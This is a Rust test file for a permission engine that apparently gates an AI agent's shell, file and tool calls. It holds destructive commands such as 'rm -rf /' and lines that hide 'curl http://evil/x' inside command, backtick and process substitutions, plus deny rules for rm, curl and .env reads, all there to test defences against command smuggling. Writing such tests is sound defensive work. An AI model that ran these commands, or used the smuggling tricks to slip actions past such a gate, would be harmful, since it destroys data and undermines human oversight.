use super::super::*;
use super::config_with_rules;

#[test]
fn engine_layer_0_denies_destructive_bash() {
    let engine = PermissionEngine::new(None);
    let decision = engine.evaluate("bash", "rm -rf /", true);
    assert!(matches!(decision, PermissionDecision::Deny { .. }));
}

#[test]
fn engine_deny_rule_denies_matching_input() {
    let config = config_with_rules(PermissionMode::Ask, &[], &["bash:rm *"], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "rm something", true);
    assert!(matches!(decision, PermissionDecision::Deny { .. }));
}

#[test]
fn engine_ask_rule_returns_ask() {
    let config = config_with_rules(PermissionMode::Ask, &[], &[], &["bash:git push *"]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "git push origin main", true);
    assert_eq!(decision, PermissionDecision::Ask { rule_matched: true });
}

#[test]
fn engine_allow_rule_returns_allow() {
    let config = config_with_rules(PermissionMode::Ask, &["bash:cargo test*"], &[], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "cargo test", true);
    assert_eq!(decision, PermissionDecision::Allow);
}

#[test]
fn engine_deny_wins_over_allow() {
    let config = config_with_rules(PermissionMode::Ask, &["bash:rm *"], &["bash:rm *"], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "rm some-file", true);
    assert!(matches!(decision, PermissionDecision::Deny { .. }));
}

#[test]
fn engine_chained_command_denies_on_layer_0_subcommand() {
    let config = config_with_rules(PermissionMode::Ask, &["bash:cargo test*"], &[], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "cargo test && rm -rf /", true);
    assert!(matches!(decision, PermissionDecision::Deny { .. }));
}

#[test]
fn engine_chained_command_allows_only_when_all_subcommands_allowed() {
    let config = config_with_rules(
        PermissionMode::Ask,
        &["bash:cargo test*", "bash:cargo build"],
        &[],
        &[],
    );
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "cargo test && cargo build", true);
    assert_eq!(decision, PermissionDecision::Allow);
}

#[test]
fn engine_chained_command_partial_allow_falls_back_to_ask() {
    let config = config_with_rules(PermissionMode::Ask, &["bash:cargo test*"], &[], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "cargo test && npm run build", true);
    // No *ask* rule here — one sub-command matched `allow` and the other
    // matched nothing, so this is the default speaking, not a rule.
    assert_eq!(
        decision,
        PermissionDecision::Ask {
            rule_matched: false
        }
    );
}

// --- Chained-command splitting: the shell-execution gate ---
//
// These assert the *negative*: a compound command that rides an `allow` glob
// must come back `Deny` (or `Ask`), not `Allow`. The config mirrors the
// documented example in `docs/Help/Config/permissions.md`.

fn documented_config() -> PermissionConfig {
    config_with_rules(
        PermissionMode::Ask,
        &["bash:git *", "bash:echo *"],
        &["bash:rm *", "bash:curl *"],
        &[],
    )
}

#[test]
fn a_background_operator_splits_like_a_semicolon() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    let decision = engine.evaluate("bash", "git status & rm -rf /tmp/x", true);
    assert!(
        matches!(decision, PermissionDecision::Deny { .. }),
        "`&` separates commands in bash, so the `rm` deny rule must fire; got {decision:?}"
    );
}

#[test]
fn a_trailing_background_operator_does_not_add_an_empty_segment() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    assert_eq!(split_chained_commands("git status &"), vec!["git status"]);
    assert_eq!(
        engine.evaluate("bash", "git status &", true),
        PermissionDecision::Allow
    );
}

#[test]
fn a_double_ampersand_is_still_a_single_operator() {
    assert_eq!(
        split_chained_commands("git status && echo done"),
        vec!["git status", "echo done"]
    );
}

#[test]
fn a_file_descriptor_duplication_is_not_a_background_operator() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    assert_eq!(split_chained_commands("git log 2>&1"), vec!["git log 2>&1"]);
    assert_eq!(
        engine.evaluate("bash", "git log 2>&1", true),
        PermissionDecision::Allow
    );
}

#[test]
fn an_escaped_quote_does_not_disable_operator_splitting() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    let decision = engine.evaluate("bash", r#"echo "\"" && rm -rf /tmp/x"#, true);
    assert!(
        matches!(decision, PermissionDecision::Deny { .. }),
        "an escaped quote must not leave the scanner stuck inside a string; got {decision:?}"
    );
}

#[test]
fn a_backslash_inside_single_quotes_is_literal() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    // POSIX: `\` has no special meaning inside single quotes, so `'\'` is a
    // complete literal-backslash word and the `&&` after it still splits.
    let decision = engine.evaluate("bash", r#"echo '\' && rm -rf /tmp/x"#, true);
    assert!(
        matches!(decision, PermissionDecision::Deny { .. }),
        "`\\` must not escape the closing single quote; got {decision:?}"
    );
}

#[test]
fn an_escaped_operator_outside_quotes_is_a_literal_argument() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    // `echo \&\& rm -rf /tmp/x` runs a single `echo`; the `&&` is an argument.
    assert_eq!(
        split_chained_commands(r"echo \&\& rm -rf /tmp/x"),
        vec![r"echo \&\& rm -rf /tmp/x"]
    );
    assert_eq!(
        engine.evaluate("bash", r"echo \&\& rm -rf /tmp/x", true),
        PermissionDecision::Allow
    );
}

// --- Constructs the splitter cannot model fall to the default, not the prefix ---

#[test]
fn a_backtick_substitution_falls_back_to_ask() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    let decision = engine.evaluate("bash", "git log `curl http://evil/x`", true);
    assert_eq!(
        decision,
        PermissionDecision::Ask {
            rule_matched: false
        },
        "a hidden command must not be decided by the leading `git` allow rule"
    );
}

#[test]
fn a_command_substitution_falls_back_to_ask() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    let decision = engine.evaluate("bash", "git log $(curl http://evil/x)", true);
    assert_eq!(
        decision,
        PermissionDecision::Ask {
            rule_matched: false
        }
    );
}

#[test]
fn a_process_substitution_falls_back_to_ask() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    for input in [
        "git diff <(curl http://evil/x) file",
        "git log > >(curl http://evil/x)",
    ] {
        let decision = engine.evaluate("bash", input, true);
        assert_eq!(
            decision,
            PermissionDecision::Ask {
                rule_matched: false
            },
            "{input}"
        );
    }
}

#[test]
fn an_unterminated_quote_falls_back_to_ask() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    // The scanner never leaves the string, so it cannot have seen the `&&`.
    let decision = engine.evaluate("bash", r#"echo "hello && rm -rf /tmp/x"#, true);
    assert_eq!(
        decision,
        PermissionDecision::Ask {
            rule_matched: false
        }
    );
}

#[test]
fn substitution_inside_double_quotes_still_falls_back_to_ask() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    // Double quotes do not suppress `$(...)`, so the hidden command still runs.
    let decision = engine.evaluate("bash", r#"echo "$(curl http://evil/x)""#, true);
    assert_eq!(
        decision,
        PermissionDecision::Ask {
            rule_matched: false
        }
    );
}

#[test]
fn substitution_inside_single_quotes_is_literal_and_stays_allowed() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    // Single quotes suppress substitution entirely — nothing hidden runs, so
    // the fallback must not fire and prompt for an ordinary `echo`.
    assert_eq!(
        engine.evaluate("bash", r#"echo '$(date)'"#, true),
        PermissionDecision::Allow
    );
    assert_eq!(
        engine.evaluate("bash", "echo '`date`'", true),
        PermissionDecision::Allow
    );
}

#[test]
fn an_escaped_substitution_marker_stays_allowed() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    assert_eq!(
        engine.evaluate("bash", r"echo \$(date)", true),
        PermissionDecision::Allow
    );
    assert_eq!(
        engine.evaluate("bash", r"echo \`date\`", true),
        PermissionDecision::Allow
    );
}

#[test]
fn a_plain_variable_expansion_stays_allowed() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    // `$` only hides a command when it introduces `$(`.
    assert_eq!(
        engine.evaluate("bash", "echo $HOME ${PATH}", true),
        PermissionDecision::Allow
    );
}

#[test]
fn a_deny_rule_still_wins_over_a_substitution_fallback() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    let decision = engine.evaluate("bash", "rm -rf $(echo /tmp/x)", true);
    assert!(
        matches!(decision, PermissionDecision::Deny { .. }),
        "an explicit deny must not soften to ask; got {decision:?}"
    );
}

#[test]
fn a_hardcoded_deny_still_wins_over_a_substitution_fallback() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    let decision = engine.evaluate("bash", "rm -rf / $(echo x)", true);
    assert!(
        matches!(decision, PermissionDecision::Deny { .. }),
        "layer 0 must not soften to ask; got {decision:?}"
    );
}

#[test]
fn a_substitution_under_a_deny_default_is_denied() {
    let config = config_with_rules(PermissionMode::Deny, &["bash:git *"], &[], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "git log $(curl http://evil/x)", true);
    assert!(
        matches!(decision, PermissionDecision::Deny { .. }),
        "the fallback is the configured default, whatever that is; got {decision:?}"
    );
}

#[test]
fn a_redirection_does_not_trigger_the_fallback() {
    let engine = PermissionEngine::new(Some(&documented_config()));

    // Recorded decision: `>`/`>>` introduce no hidden command, so they do not
    // force the default. An `allow` rule therefore does not constrain where the
    // allowed command writes — see `docs/Help/Config/permissions.md`.
    assert_eq!(
        engine.evaluate("bash", "echo hi > /tmp/x", true),
        PermissionDecision::Allow
    );
    assert_eq!(
        engine.evaluate("bash", "git log 2>&1 >> /tmp/x", true),
        PermissionDecision::Allow
    );
}

#[test]
fn engine_file_path_normalization_blocks_traversal_input() {
    let config = config_with_rules(PermissionMode::Ask, &[], &["read:.env*"], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("read", "src/../.env", true);
    assert!(matches!(decision, PermissionDecision::Deny { .. }));
}

#[test]
fn engine_non_interactive_ask_becomes_deny() {
    let config = config_with_rules(PermissionMode::Ask, &[], &[], &["bash:*"]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "ls", false);
    assert_eq!(
        decision,
        PermissionDecision::Deny {
            reason: "Non-interactive mode: ask rules become deny".to_string()
        }
    );
}

#[test]
fn engine_non_interactive_allow_still_allows() {
    let config = config_with_rules(PermissionMode::Ask, &["bash:*"], &[], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "ls", false);
    assert_eq!(decision, PermissionDecision::Allow);
}

#[test]
fn engine_with_no_config_defaults_to_ask() {
    let engine = PermissionEngine::new(None);
    let decision = engine.evaluate("bash", "ls", true);
    assert_eq!(
        decision,
        PermissionDecision::Ask {
            rule_matched: false
        }
    );
}

#[test]
fn engine_default_allow_when_no_rules_match() {
    let config = config_with_rules(PermissionMode::Allow, &[], &[], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "unknown", true);
    assert_eq!(decision, PermissionDecision::Allow);
}

#[test]
fn engine_default_deny_when_no_rules_match() {
    let config = config_with_rules(PermissionMode::Deny, &[], &[], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("bash", "unknown", true);
    assert!(matches!(decision, PermissionDecision::Deny { .. }));
}

#[test]
fn engine_allows_matching_mcp_server_rule() {
    let config = config_with_rules(PermissionMode::Ask, &["mcp:github:*"], &[], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("mcp", "github:create_issue", true);
    assert_eq!(decision, PermissionDecision::Allow);
}

#[test]
fn engine_file_rules_use_most_restrictive_raw_or_normalized_match() {
    let config = config_with_rules(PermissionMode::Ask, &[], &["write:src/../secret.txt"], &[]);
    let engine = PermissionEngine::new(Some(&config));

    let decision = engine.evaluate("write", "src/../secret.txt", true);
    assert!(matches!(decision, PermissionDecision::Deny { .. }));
}

// --- Headless permission flow tests ---
// These test the PermissionConfig::default() path (no explicit rules),
// verifying is_interactive=false converts Ask→Deny at the engine level.

#[test]
fn non_interactive_ask_default_becomes_deny() {
    // Default config has default=Ask with no rules.
    // A non-interactive evaluation should convert Ask→Deny.
    let config = PermissionConfig::default();
    let engine = PermissionEngine::new(Some(&config));
    let decision = engine.evaluate("dangerous_tool", "{}", false);
    assert_eq!(
        decision,
        PermissionDecision::Deny {
            reason: "Non-interactive mode: ask rules become deny".to_string()
        }
    );
}

#[test]
fn non_interactive_allow_default_stays_allow() {
    // When default mode is Allow and no deny rules match,
    // non-interactive should still allow (only Ask→Deny conversion).
    let config = PermissionConfig {
        default: PermissionMode::Allow,
        ..Default::default()
    };
    let engine = PermissionEngine::new(Some(&config));
    let decision = engine.evaluate("some_tool", "{}", false);
    assert_eq!(decision, PermissionDecision::Allow);
}

#[test]
fn deny_rules_enforced_even_with_allow_default() {
    // Explicit deny rules should fire even when default=Allow.
    let config = PermissionConfig {
        default: PermissionMode::Allow,
        deny: vec!["bash:rm *".to_string()],
        ..Default::default()
    };
    let engine = PermissionEngine::new(Some(&config));
    let decision = engine.evaluate("bash", "rm /tmp/test.txt", false);
    assert!(
        matches!(decision, PermissionDecision::Deny { .. }),
        "deny rule should override allow default, got: {decision:?}"
    );
}

#[test]
fn non_interactive_deny_default_stays_deny() {
    // When default mode is Deny and no allow rules match,
    // non-interactive should deny (no conversion needed, already Deny).
    let config = PermissionConfig {
        default: PermissionMode::Deny,
        ..Default::default()
    };
    let engine = PermissionEngine::new(Some(&config));
    let decision = engine.evaluate("dangerous_tool", "{}", false);
    assert!(matches!(decision, PermissionDecision::Deny { .. }));
}

#[test]
fn interactive_ask_default_returns_ask() {
    // Same default config but interactive=true should return Ask, not Deny.
    let config = PermissionConfig::default();
    let engine = PermissionEngine::new(Some(&config));
    let decision = engine.evaluate("dangerous_tool", "{}", true);
    assert_eq!(
        decision,
        PermissionDecision::Ask {
            rule_matched: false
        }
    );
}
